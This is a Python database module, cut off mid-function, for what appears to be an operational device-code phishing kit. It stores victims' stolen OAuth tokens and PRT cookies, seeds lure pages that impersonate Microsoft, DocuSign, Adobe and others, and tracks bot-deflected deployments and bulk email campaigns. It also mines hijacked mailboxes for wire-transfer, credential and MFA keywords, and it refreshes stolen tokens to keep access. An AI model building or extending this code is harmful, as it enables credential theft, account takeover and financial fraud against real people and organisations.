# ── db.py ─────────────────────────────────────────────────
import sqlite3
import logging
import json
import base64
import time
import secrets
from werkzeug.security import generate_password_hash, check_password_hash
from config import Config

logger = logging.getLogger(__name__)

def decode_jwt_payload(token):
    try:
        parts = token.split('.')
        if len(parts) == 3:
            payload = parts[1]
            payload += '=' * (-len(payload) % 4)
            decoded = base64.urlsafe_b64decode(payload).decode('utf-8')
            return json.loads(decoded)
    except Exception as e:
        logger.warning(f"Failed to decode JWT payload: {e}")
    return {}

def init_db():
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''CREATE TABLE IF NOT EXISTS templates (
        id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT UNIQUE, service TEXT, icon TEXT)''')
    
    cursor.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_code TEXT UNIQUE, device_code TEXT,
        verification_uri TEXT, template_id INTEGER, phishing_url TEXT, status TEXT DEFAULT 'PENDING',
        access_token TEXT, refresh_token TEXT, victim_name TEXT, victim_email TEXT, victim_role TEXT,
        victim_ip TEXT, victim_browser TEXT, token_metadata TEXT, teams_token TEXT, prt_cookie TEXT,
        access_token_expiry INTEGER, refresh_token_expiry INTEGER,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, completed_at TIMESTAMP,
        FOREIGN KEY (template_id) REFERENCES templates(id))''')
    
    new_cols = [
        ('teams_token', 'TEXT'), ('prt_cookie', 'TEXT'), 
        ('access_token_expiry', 'INTEGER'), ('refresh_token_expiry', 'INTEGER')
    ]
    for col, dtype in new_cols:
        try:
            cursor.execute(f"ALTER TABLE sessions ADD COLUMN {col} {dtype}")
        except sqlite3.OperationalError: pass

    cursor.execute("SELECT COUNT(*) FROM templates")
    if cursor.fetchone()[0] == 0:
        cursor.executemany("INSERT OR IGNORE INTO templates (name, service, icon) VALUES (?, ?, ?)", [
            ('Microsoft 365', 'Microsoft 365', '🟦'),
            ('Adobe', 'Adobe', '🔴'),
            ('DocuSign', 'DocuSign', '📄'),
            ('Dropbox', 'Dropbox', '📦'),
            ('OneDrive', 'OneDrive', '📁'),
            ('QuickBooks', 'QuickBooks', '🟩'),
            ('Outlook', 'Outlook', '📧'),
            ('SharePoint', 'SharePoint', '📂'),
            ('OneDrive Shared Document', 'OneDrive', '☁️'),
            ('Teams Meeting Invitation', 'Teams', '💬'),
            ('SharePoint File Request', 'SharePoint', '📁'),
            ('Outlook Security Alert', 'Outlook', '📧'),
            ('Azure MFA Prompt', 'Azure', '🔐')])
        
    cursor.execute('''CREATE TABLE IF NOT EXISTS b2b_campaigns (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        subject_lines TEXT,
        link_lines TEXT,
        body_html TEXT,
        recipients TEXT,
        sender_user_code TEXT,
        priority TEXT DEFAULT 'normal',
        delay_ms INTEGER DEFAULT 0,
        subject_rotate_n INTEGER DEFAULT 1,
        link_rotate_n INTEGER DEFAULT 1,
        bcc_mode INTEGER DEFAULT 0,
        save_sent INTEGER DEFAULT 1,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')

    # ── Phase 1: Pre-Land template library ──────────────────────────────────
    # Stores reusable pre-land page definitions (DocuSign, OneDrive lure, etc.)
    cursor.execute('''CREATE TABLE IF NOT EXISTS preland_templates (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        name        TEXT UNIQUE NOT NULL,       -- e.g. "DocuSign"
        category    TEXT,                       -- e.g. "Document", "Invoice"
        description TEXT,
        icon        TEXT,                       -- emoji or URL
        default_config TEXT DEFAULT '{}',       -- JSON: default customisation values
        html_body   TEXT DEFAULT '',            -- base HTML for this pre-land style
        created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')

    # ── Phase 1: Landing / Success template library ──────────────────────────
    # Reuses the existing `templates` table already seeded with MS365, OneDrive, etc.
    # No new table needed — deployments reference templates(id) for landing/success.

    # ── Phase 1: Deployments ─────────────────────────────────────────────────
    cursor.execute('''CREATE TABLE IF NOT EXISTS deployments (
        id                  INTEGER PRIMARY KEY AUTOINCREMENT,
        name                TEXT,               -- friendly label
        domain              TEXT NOT NULL,       -- e.g. laavio.info
        subdomain           TEXT DEFAULT '',     -- e.g. login  (empty = apex)
        path                TEXT DEFAULT '',     -- e.g. verify  (slug after /)
        full_url            TEXT,               -- computed on deploy

        -- Pre-land configuration
        preland_template_id INTEGER REFERENCES preland_templates(id),
        preland_config      TEXT DEFAULT '{}',  -- JSON overrides (title, doc name, colours…)
        preland_html_cache  TEXT DEFAULT '',    -- rendered HTML served to victims

        -- Landing & success
        landing_template_id INTEGER REFERENCES templates(id),
        success_template_id INTEGER REFERENCES templates(id),
        success_url         TEXT DEFAULT 'https://www.office.com/',

        -- Languages / translation
        languages           TEXT DEFAULT '["en"]',  -- JSON array of ISO codes

        -- Status & metrics
        status              TEXT DEFAULT 'draft',   -- draft | active | paused | deleted
        victim_hits         INTEGER DEFAULT 0,
        victim_captured     INTEGER DEFAULT 0,

        deployed_at         TIMESTAMP,
        created_at          TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')

    try:
        cursor.execute("ALTER TABLE deployments ADD COLUMN landing_config TEXT DEFAULT '{}'")
    except sqlite3.OperationalError: pass
    try:
        cursor.execute("ALTER TABLE deployments ADD COLUMN landing_mode TEXT DEFAULT 'S'")
    except sqlite3.OperationalError: pass
    try:
        cursor.execute("ALTER TABLE deployments ADD COLUMN success_config TEXT DEFAULT '{}'")
    except sqlite3.OperationalError: pass
    try:
        cursor.execute("ALTER TABLE deployments ADD COLUMN human_hits INTEGER DEFAULT 0")
    except sqlite3.OperationalError: pass
    try:
        cursor.execute("ALTER TABLE deployments ADD COLUMN bot_hits INTEGER DEFAULT 0")
    except sqlite3.OperationalError: pass

    # ── Phase 1: Owned domains ───────────────────────────────────────────────
    cursor.execute('''CREATE TABLE IF NOT EXISTS owned_domains (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        domain      TEXT UNIQUE NOT NULL,
        registrar   TEXT DEFAULT 'namecheap',
        expiry_date TEXT,
        ns_configured INTEGER DEFAULT 0,        -- 1 once NS points to our server
        auto_renew  INTEGER DEFAULT 1,
        status      TEXT DEFAULT 'active',
        deleted_at  TIMESTAMP DEFAULT NULL,
        purchased_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')

    # ── Phase 1: Per-visit hit log ───────────────────────────────────────────
    cursor.execute('''CREATE TABLE IF NOT EXISTS deployment_hits (
        id              INTEGER PRIMARY KEY AUTOINCREMENT,
        deployment_id   INTEGER REFERENCES deployments(id),
        visitor_ip      TEXT,
        visitor_ua      TEXT,
        stage           TEXT,   -- 'preland' | 'landing' | 'success' | 'bot_deflected'
        session_user_code TEXT, -- linked ICEBADGER session if captured
        hit_at          TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        is_bot          INTEGER DEFAULT 0,
        bot_type        TEXT DEFAULT ''
    )''')
    try:
        cursor.execute("ALTER TABLE deployment_hits ADD COLUMN is_bot INTEGER DEFAULT 0")
    except sqlite3.OperationalError: pass
    try:
        cursor.execute("ALTER TABLE deployment_hits ADD COLUMN bot_type TEXT DEFAULT ''")
    except sqlite3.OperationalError: pass

    # ── Seed pre-land templates (INSERT OR IGNORE so new ones are added to existing DBs) ─
    _preland_seeds = [
        ('OneDrive', 'Document', 'OneDrive shared file lure', '☁️',
         '{"title":"Protected Document","description":"This file is protected by your organization\'s security policies. Verify your identity to access this.","doc_name":"Shared-File.docx","doc_badge":"DOCX","doc_sub":"OneDrive file · Access required","button_label":"Access Protected File","footer_caption":"Verify your identity to access this file","footer_text":"End-to-end encrypted","accent_color":"#0078D4","landing_title":"Sign Document","landing_desc":"Sign in with your Microsoft account to verify your identity and complete the signing process.","landing_doc_sub":"OneDrive file · Awaiting access","success_title":"Shared file access review","success_desc":"Thanks for verifying your identity. You will be redirected to Microsoft 365 shortly.","page_color":"#f3f2f1","card_bg":"#ffffff"}'),
        ('OneDrive Share', 'Document', 'OneDrive shared file lure (alias)', '☁️',
         '{"title":"Shared with you","description":"A file has been shared with you via Microsoft OneDrive.","doc_name":"Q3-Report.xlsx","doc_badge":"XLSX","doc_sub":"OneDrive file · Access required","button_label":"Open in OneDrive","footer_caption":"Sign in to view this file","footer_text":"Microsoft OneDrive","accent_color":"#0078D4","landing_title":"Sign Document","landing_doc_sub":"OneDrive file · Awaiting access","success_title":"Shared file access review","success_desc":"Thanks for verifying your identity. You will be redirected to Microsoft 365 shortly.","page_color":"#f3f2f1","card_bg":"#ffffff"}'),
        ('QuickBooks', 'Finance', 'QuickBooks accounting document lure', '💚',
         '{"title":"Protected Document","description":"This file is protected by your organization\'s security policies. Verify your identity to access.","doc_name":"Protected-Document.pdf","doc_badge":"PDF","doc_sub":"Protected Document · Access Required","button_label":"Access Protected File","footer_caption":"Verify your identity to access this file","footer_text":"End-to-end encrypted","accent_color":"#2CB34A","landing_title":"Sign Document","landing_desc":"Sign in with your Microsoft account to verify your identity and complete the signing process.","landing_doc_sub":"QuickBook Document · Awaiting Signature","doc_name_landing":"Service-Agreement.pdf","success_title":"Accounting portal sign-in","success_desc":"Thanks for verifying your identity. You will be redirected to Microsoft 365 shortly.","page_color":"#f5f5f5","card_bg":"#ffffff"}'),
        ('Outlook', 'Email', 'Outlook mailbox security lure', '📧',
         '{"title":"Protected Document","description":"This file is protected by your organization\'s security policies. Verify your identity to access.","doc_name":"Protected-Document.pdf","doc_badge":"PDF","doc_sub":"Protected document · Verify to access","button_label":"Access Protected File","footer_caption":"Verify your identity to access this file","footer_text":"End-to-end encrypted","accent_color":"#0078D4","landing_title":"Sign Document","landing_desc":"Sign in with your Microsoft account to verify your identity and complete the signing process.","landing_doc_sub":"Outlook document · Awaiting Signature","doc_name_landing":"Service-Agreement.pdf","success_title":"Mailbox security check","success_desc":"Thanks for verifying your identity. You will be redirected to Microsoft 365 shortly.","page_color":"#f5f5f5","card_bg":"#ffffff"}'),
        ('DocuSign', 'Document', 'DocuSign document lure', '📄',
         '{"title":"Protected Document","description":"This file is protected by your organization\'s security policies.","doc_name":"Financial-Report-2026.docx","doc_badge":"DOCX","doc_meta":"Cashflow Statement · 2.2 MB","button_label":"Access Protected File","footer_caption":"Verify your identity to access this file","footer_text":"End-to-end encrypted","spinner_color":"#7C3AED","accent_color":"#7C3AED","page_color":"#ffffff","card_bg":"#ffffff"}'),
        ('SharePoint Request', 'Document', 'SharePoint file request lure', '📁',
         '{"title":"File Access Request","description":"You have been granted access to a SharePoint document.","doc_name":"Project-Brief.pdf","doc_badge":"PDF","doc_meta":"PDF Document · 3.4 MB","button_label":"Open Document","footer_caption":"Authentication required","footer_text":"Microsoft SharePoint","accent_color":"#038387","page_color":"#ffffff","card_bg":"#ffffff"}'),
        ('Adobe Sign', 'Document', 'Adobe Sign signature request lure', '✍️',
         '{"title":"Signature Required","description":"You have a document waiting for your signature.","doc_name":"Contract-Agreement.pdf","doc_badge":"PDF","doc_meta":"Contract · 890 KB","button_label":"Review & Sign","footer_caption":"Sign in to Adobe to continue","footer_text":"Adobe Sign · Legally binding","accent_color":"#FA0F00","page_color":"#f8f8f8","card_bg":"#ffffff"}'),
        ('Dropbox Share', 'Document', 'Dropbox shared file lure', '📦',
         '{"title":"Dropbox File Shared","description":"Someone shared a file with you on Dropbox.","doc_name":"Proposal-v2.pptx","doc_badge":"PPTX","doc_meta":"PowerPoint · 5.1 MB","button_label":"View on Dropbox","footer_caption":"Sign in to access","footer_text":"Dropbox","accent_color":"#0061FF","page_color":"#ffffff","card_bg":"#ffffff"}'),
        ('Microsoft Teams', 'Collaboration', 'Microsoft Teams meeting invitation lure', '💬',
         '{"title":"Join Microsoft Teams Meeting","description":"You have been invited to join a secured Microsoft Teams video & audio meeting room. Identity verification is required to admit external participants to the virtual lobby.","doc_name":"Teams-Meeting-Invitation.ics","doc_badge":"ICS","doc_sub":"Microsoft Teams Video Conference · Lobby access required","button_label":"Join Teams Meeting","footer_caption":"Protected by Microsoft Teams enterprise security policies","footer_text":"End-to-end encrypted video & audio stream","accent_color":"#5B5FC7","landing_title":"Sign in to Join Meeting Room","landing_desc":"Sign in with your Microsoft account to authenticate and enter the virtual meeting lobby.","landing_doc_sub":"Scheduled Meeting Room · Lobby access required","success_title":"Lobby Access Authorized","success_desc":"Thanks for verifying your identity. You are now being admitted to the Microsoft Teams meeting room...","page_color":"#f3f2f8","card_bg":"#ffffff"}'),
        ('Cloud Voicemail', 'Voice', 'Exchange Online cloud voicemail lure', '🎙️',
         '{"title":"New Encrypted Voicemail (0:48)","description":"You have received a high-priority encrypted voice message. Verify your identity with your organizational account to decrypt the audio recording and play.","doc_name":"Voicemail-External-(0m48s).wav","doc_badge":"WAV","doc_sub":"Exchange Cloud Voicemail · Decryption required","button_label":"▶ Play Encrypted Voicemail","footer_caption":"Encrypted via Microsoft 365 Cloud Voicemail","footer_text":"Protected voice transmission · Exchange Online","accent_color":"#0078D4","landing_title":"Decrypt Audio Voice Message","landing_desc":"Authenticate with your Microsoft account to decrypt audio and stream the voicemail message.","landing_doc_sub":"Exchange Cloud Voicemail · Decryption required","success_title":"Voicemail Decrypted","success_desc":"Authentication successful. Audio decrypted, starting playback stream...","page_color":"#f2f6fa","card_bg":"#ffffff"}')
    ]

    cursor.executemany(
        'INSERT OR IGNORE INTO preland_templates (name, category, description, icon, default_config) VALUES (?,?,?,?,?)',
        _preland_seeds
    )
    cursor.executemany(
        'INSERT OR IGNORE INTO templates (name, service, icon) VALUES (?, ?, ?)', [
            ('Microsoft Teams', 'Teams', '💬'),
            ('Cloud Voicemail', 'Voicemail', '🎙️')
        ]
    )

    # ── Keyword Alerts Tables ────────────────────────────────────────────────
    cursor.execute('''CREATE TABLE IF NOT EXISTS keyword_rules (
        id              INTEGER PRIMARY KEY AUTOINCREMENT,
        name            TEXT NOT NULL,
        category        TEXT DEFAULT 'Custom',
        severity        TEXT DEFAULT 'HIGH',     -- 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'INFO'
        keywords        TEXT NOT NULL,           -- JSON array of strings
        search_scope    TEXT DEFAULT 'all',      -- 'all' | 'subject' | 'body' | 'attachments'
        target_account  TEXT DEFAULT 'all',      -- 'all' or specific user_code
        notify_telegram INTEGER DEFAULT 1,
        notify_webhook  INTEGER DEFAULT 1,
        is_active       INTEGER DEFAULT 1,
        created_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')

    cursor.execute('''CREATE TABLE IF NOT EXISTS keyword_matches (
        id                  INTEGER PRIMARY KEY AUTOINCREMENT,
        rule_id             INTEGER REFERENCES keyword_rules(id) ON DELETE SET NULL,
        session_user_code   TEXT NOT NULL,
        victim_name         TEXT DEFAULT '',
        victim_email        TEXT DEFAULT '',
        matched_keyword     TEXT NOT NULL,
        email_subject       TEXT DEFAULT '',
        email_sender        TEXT DEFAULT '',
        email_snippet       TEXT DEFAULT '',
        message_id          TEXT NOT NULL,
        received_datetime   TEXT DEFAULT '',
        is_triaged          INTEGER DEFAULT 0,
        created_at          TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        UNIQUE(session_user_code, message_id, matched_keyword)
    )''')

    cursor.execute('''CREATE TABLE IF NOT EXISTS keyword_alert_ledger (
        id                  INTEGER PRIMARY KEY AUTOINCREMENT,
        session_user_code   TEXT NOT NULL,
        message_id          TEXT NOT NULL,
        first_alerted_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        received_datetime   TEXT DEFAULT '',
        UNIQUE(session_user_code, message_id)
    )''')
    cursor.execute('''INSERT OR IGNORE INTO keyword_alert_ledger (session_user_code, message_id, received_datetime)
                      SELECT DISTINCT session_user_code, message_id, received_datetime FROM keyword_matches''')

    # Multi-Operator Role-Based Access Control tables
    cursor.execute('''CREATE TABLE IF NOT EXISTS operators (
        id            INTEGER PRIMARY KEY AUTOINCREMENT,
        username      TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role          TEXT DEFAULT 'operator',
        status        TEXT DEFAULT 'active',
        token         TEXT UNIQUE,
        created_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_login    TIMESTAMP
    )''')
    try:
        cursor.execute("ALTER TABLE operators ADD COLUMN token TEXT")
    except sqlite3.OperationalError:
        pass
    try:
        cursor.execute("ALTER TABLE operators ADD COLUMN tg_bot_token TEXT")
    except sqlite3.OperationalError:
        pass
    try:
        cursor.execute("ALTER TABLE operators ADD COLUMN tg_chat_id TEXT")
    except sqlite3.OperationalError:
        pass

    new_op_cols = [
        ('bound_device_hash', 'TEXT'),
        ('bound_ip', 'TEXT'),
        ('bound_device_info', 'TEXT'),
        ('active_session_nonce', 'TEXT'),
        ('sharing_violations_count', 'INTEGER DEFAULT 0')
    ]
    for col, dtype in new_op_cols:
        try:
            cursor.execute(f"ALTER TABLE operators ADD COLUMN {col} {dtype}")
        except sqlite3.OperationalError:
            pass

    cursor.execute("SELECT id FROM operators WHERE token IS NULL OR token = ''")
    for r in cursor.fetchall():
        cursor.execute("UPDATE operators SET token = ? WHERE id = ?", (secrets.token_hex(6), r[0]))

    cursor.execute('''CREATE TABLE IF NOT EXISTS operator_assignments (
        id                INTEGER PRIMARY KEY AUTOINCREMENT,
        operator_id       INTEGER NOT NULL REFERENCES operators(id) ON DELETE CASCADE,
        session_user_code TEXT NOT NULL,
        assigned_at       TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        UNIQUE(operator_id, session_user_code)
    )''')

    # Seed default Red Team keyword rules if table is empty
    cursor.execute("SELECT COUNT(*) FROM keyword_rules")
    if cursor.fetchone()[0] == 0:
        _default_rules = [
            (
                'Financial & Wire Transfers', 'Finance', 'CRITICAL',
                json.dumps(['wire transfer', 'swift', 'remittance', 'banking instructions', 'routing number', 'bank account', 'ach transfer', 'invoice overdue', 'payment confirmation', 'beneficiary']),
                'all', 'all', 1, 1, 1
            ),
            (
                'Credentials & Authentication', 'Credentials', 'CRITICAL',
                json.dumps(['password reset', 'temporary password', 'one-time password', 'otp', 'verification code', 'mfa code', '2fa', 'your new credentials', 'access token', 'api key', 'private key']),
                'all', 'all', 1, 1, 1
            ),
            (
                'Executive & Confidential', 'Executive', 'HIGH',
                json.dumps(['confidential', 'strictly confidential', 'non-disclosure agreement', 'nda', 'board meeting', 'merger', 'acquisition', 'executive summary', 'compensation', 'audit report']),
                'all', 'all', 1, 1, 1
            ),
            (
                'Cloud & IT Infrastructure', 'Infrastructure', 'MEDIUM',
                json.dumps(['azure portal', 'aws root', 'tenant admin', 'global admin', 'powershell', 'firewall rule', 'domain controller', 'vpn configuration', 'ssh key']),
                'all', 'all', 1, 1, 1
            )
        ]
        cursor.executemany('''INSERT INTO keyword_rules 
            (name, category, severity, keywords, search_scope, target_account, notify_telegram, notify_webhook, is_active)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''', _default_rules)

    conn.commit()
    conn.close()


def create_session(user_code, device_code, verification_uri, template_id, phishing_url, client_ip="N/A", user_agent="N/A"):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        cursor.execute('''INSERT INTO sessions (user_code, device_code, verification_uri, template_id, phishing_url, victim_ip, victim_browser, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, 'PENDING')''', (user_code, device_code, verification_uri, template_id, phishing_url, client_ip, user_agent))
        conn.commit()
        return cursor.lastrowid
    except sqlite3.IntegrityError: return None
    finally: conn.close()

def update_session_token(user_code, access_token, refresh_token, raw_token_data):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    jwt_claims = decode_jwt_payload(access_token) if access_token else {}
    metadata = {"raw_response": raw_token_data, "jwt_claims": jwt_claims}
    at_expiry = jwt_claims.get('exp', 0)
    if not at_expiry:
        expires_in = raw_token_data.get('expires_in', 3600) if isinstance(raw_token_data, dict) else 3600
        at_expiry = int(time.time()) + int(expires_in)
    cursor.execute('''UPDATE sessions SET status = 'CAPTURED', access_token = ?, refresh_token = ?, 
        token_metadata = ?, access_token_expiry = ?, completed_at = CURRENT_TIMESTAMP WHERE user_code = ?''', 
        (access_token, refresh_token, json.dumps(metadata), at_expiry, user_code))
    conn.commit()
    conn.close()

def update_session_profile(user_code, name, email, role):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE sessions SET victim_name = ?, victim_email = ?, victim_role = ? WHERE user_code = ?', (name, email, role, user_code))
    
    # Token De-duplication: remove duplicate older sessions for the same authenticated account
    if email and email.strip() and email.strip().lower() != 'unknown':
        clean_email = email.strip().lower()
        cursor.execute('SELECT user_code FROM sessions WHERE LOWER(TRIM(victim_email)) = ? AND user_code != ?', (clean_email, user_code))
        old_sessions = cursor.fetchall()
        for (old_uc,) in old_sessions:
            cursor.execute('DELETE FROM sessions WHERE user_code = ?', (old_uc,))

    conn.commit()
    conn.close()

def update_session_artifacts(user_code, teams_token, prt_cookie):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE sessions SET teams_token = ?, prt_cookie = ? WHERE user_code = ?', (teams_token, prt_cookie, user_code))
    conn.commit()
    conn.close()

def update_session_refreshed_token(user_code, access_token, expiry, refresh_token=None):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    if refresh_token:
        cursor.execute('UPDATE sessions SET access_token = ?, access_token_expiry = ?, refresh_token = ? WHERE user_code = ?', (access_token, expiry, refresh_token, user_code))
    else:
        cursor.execute('UPDATE sessions SET access_token = ?, access_token_expiry = ? WHERE user_code = ?', (access_token, expiry, user_code))
    conn.commit()
    conn.close()

def update_session_status(user_code, status):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE sessions SET status = ? WHERE user_code = ?', (status, user_code))
    conn.commit()
    conn.close()

def delete_session(user_code):
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM sessions WHERE user_code = ?', (user_code,))
    conn.commit()
    conn.close()

def delete_all_sessions():
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM sessions')
    conn.commit()
    conn.close()

def purge_inactive_sessions():
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sessions WHERE status != 'CAPTURED'")
    deleted = cursor.rowcount
    conn.commit()
    conn.close()
    return deleted

def get_pending_sessions():
    conn = sqlite3.connect(Config.DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM sessions WHERE status = ?', ('PENDING',))
    return [dict(row) for row in cursor.fetchall()]

def get_all_sessions():
    conn = sqlite3.connect(Config.DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('''
        SELECT s.*, t.name as template_name, t.service as template_service 
        FROM sessions s 
        LEFT JOIN templates t ON s.template_id = t.id 
        ORDER BY s.created_at DESC
    ''')
    raw_sessions = [dict(row) for row in cursor.fetchall()]
    conn.close()

    # De-duplicate sessions by victim_email (keep newest session per account)
    seen_emails = set()
    deduped = []
    for s in raw_sessions:
        email = (s.get('victim_email') or '').strip().lower()
        if email and email != 'unknown':
            if email in seen_emails:
                continue
            seen_emails.add(email)
        deduped.append(s)
    return deduped

def get_templates():
    conn = sqlite3.connect(Config.DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM templates ORDER BY service, name')
    return [dict(row) for row in cursor.fetchall()]

def get_session_by_user_code(user_code):
    conn = sqlite3.connect(Config.DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM sessions WHERE user_code = ?', (user_code,))
    row = cursor.fetchone()
    return dict(row) if row else None

def get_statistics():
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM sessions"); total = cursor.fetchone()[0]
    cursor.execute("""
        SELECT COUNT(DISTINCT CASE 
            WHEN victim_email IS NOT NULL AND TRIM(victim_email) != '' AND LOWER(TRIM(victim_email)) != 'unknown' 
            THEN LOWER(TRIM(victim_email)) 
            ELSE user_code 
        END) FROM sessions WHERE status = 'CAPTURED' AND ((victim_email IS NOT NULL AND TRIM(victim_email) != '' AND LOWER(TRIM(victim_email)) != 'unknown') OR (victim_name IS NOT NULL AND TRIM(victim_name) != ''))
    """)
    captured = cursor.fetchone()[0]
    cursor.execute("""
        SELECT COUNT(DISTINCT LOWER(TRIM(victim_email))) 
        FROM sessions 
        WHERE status = 'REVOKED' 
          AND victim_email IS NOT NULL 
          AND TRIM(victim_email) != '' 
          AND LOWER(TRIM(victim_email)) != 'unknown'
    """)
    revoked = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM sessions WHERE status = 'PENDING'"); pending = cursor.fetchone()[0]
    cursor.execute("""
        SELECT COUNT(*) FROM sessions 
        WHERE status = 'EXPIRED' 
           OR (status = 'PENDING' AND (strftime('%s', 'now') - strftime('%s', created_at)) > 900)
    """)
    incomplete = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(DISTINCT template_id) FROM sessions"); templates = cursor.fetchone()[0]
    
    total_visits = 0
    today_visits = 0
    human_visits = 0
    bot_visits = 0
    today_human_visits = 0
    today_bot_visits = 0
    try:
        cursor.execute("SELECT COUNT(*) FROM deployment_hits")
        total_visits = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM deployment_hits WHERE date(hit_at) = date('now')")
        today_visits = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM deployment_hits WHERE is_bot = 0")
        human_visits = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM deployment_hits WHERE is_bot = 1")
        bot_visits = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM deployment_hits WHERE is_bot = 0 AND date(hit_at) = date('now')")
        today_human_visits = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM deployment_hits WHERE is_bot = 1 AND date(hit_at) = date('now')")
        today_bot_visits = cursor.fetchone()[0]
    except Exception:
        pass
    conn.close()
    return {
        'total_links': total, 
        'captured_accounts': captured, 
        'active_tokens': captured,
        'revoked_tokens': revoked,
        'incomplete_sessions': incomplete,
        'total_tokens': captured + revoked,
        'pending_sessions': pending, 
        'templates_used': templates,
        'total_visits': total_visits,
        'today_visits': today_visits,
        'human_visits': human_visits,
        'bot_visits': bot_visits,
        'today_human_visits': today_human_visits,
        'today_bot_visits': today_bot_visits
    }

def reset_visitor_statistics():
    """Resets visitor and telemetry hit statistics alone by clearing deployment_hits.
    Captured victim sessions, tokens, and active campaigns are strictly preserved.
    """
    conn = sqlite3.connect(Config.DB_PATH)
    cursor = conn.cursor()
    try:
        cursor.execute("DELETE FROM deployment_hits")
        conn.commit()
        logger.info("[STATISTICS] Visitor telemetry statistics successfully reset to 0.")
        return True
    except Exception as e:
        logger.error(f"[STATISTICS] Failed to reset visitor statistics: {e}")
        return False
    finally:
        conn.close()

_failed_refresh_cooldown = {}

def get_graph_access_token(session):
    """Return a valid Graph access token for this session, refreshing via PRT if expired.

    Refresh strategy: PRT only (roadtx prtauth -c msteams).
    There is intentionally NO fallback to oauth.refresh_access_token() because
    the standard broker RT grant produces a token scoped to Microsoft
    Authentication Broker, which breaks Graph Mail/Contacts access.
    """
    import time
    user_code = session.get('user_code')
    expiry    = session.get('access_token_expiry') or 0
    now_ts    = int(time.time())

    # Check failure cooldown (10 minutes) to avoid repeated roadtx subprocess blocking
    in_cooldown = user_code and (now_ts < _failed_refresh_cooldown.get(user_code, 0))

    # Attempt PRT refresh when token is expired or expiring within 60 seconds (if not in cooldown)
    if not in_cooldown and (expiry <= now_ts + 60 or not session.get('access_token')):
        try:
            import executor as _executor
            success, new_at, new_exp = _executor.refresh_via_prt(user_code)
            if success:
                _failed_refresh_cooldown.pop(user_code, None)
                session['access_token']        = new_at
                session['access_token_expiry'] = new_exp
                return new_at
            else:
                # Refresh failed (e.g. revoked PRT or network timeout) — activate 10-minute cooldown
                _failed_refresh_cooldown[user_code] = now_ts + 600
        except Exception:
            _failed_refresh_cooldown[user_code] = now_ts + 600

    if session.get('access_token'):
        return session['access_token']

    # Last resort: try to extract a token from the stored teams_token blob
    if session.get('teams_token'):
        try:
            token_data = json.loads(session['teams_token'])
            if isinstance(token_data, dict) and 'access_token' in token_data:
                return token_data['access_token']
        except Exception:
            pass
    return None

# ── Keyword Alerts DB Operations ─────────────────────────────────────────────
def get_keyword_rules(active_only=False):
    conn = sqlite3.connect(Config.DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    query = "SELECT * FROM keyword_rules"
    if active_only:
        query += " WHERE is_active = 1"
    query += " ORDER BY id ASC"
    rows = cursor.execute(query).fetchall()
    rules = []
    for r in rows:
        d = dict(r)
        try:
            d['keywords'] = json.loads(d['keywords'])
        except Exception:
            d['keywords'] = [k.strip() for k in str(d['keywords']).split(',') if k.strip()]
        rules.append(d)
    conn.close()
    return rules

def get_keyword_rule(rule_id):
    conn = sqlite3.connect(Config.DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    row = cursor.execute("SELECT * FROM keyword_rules WHERE id = ?", (rule_id,)).fetchone()
    conn.close()
    if not row:
        return None
    d = dict(row)
    try:
        d['keywords'] = json.loads(d['keywords'])
    except Exception:
        d['keywords'] = [k.strip() for k in str(d['keywords']).split(',') if k.strip()]
    return d

def add_keyword_rule(name, category, severity, keywords, search_scope='all', target_account='all', notify_telegram=1, notify_webhook=1, is_active=1):
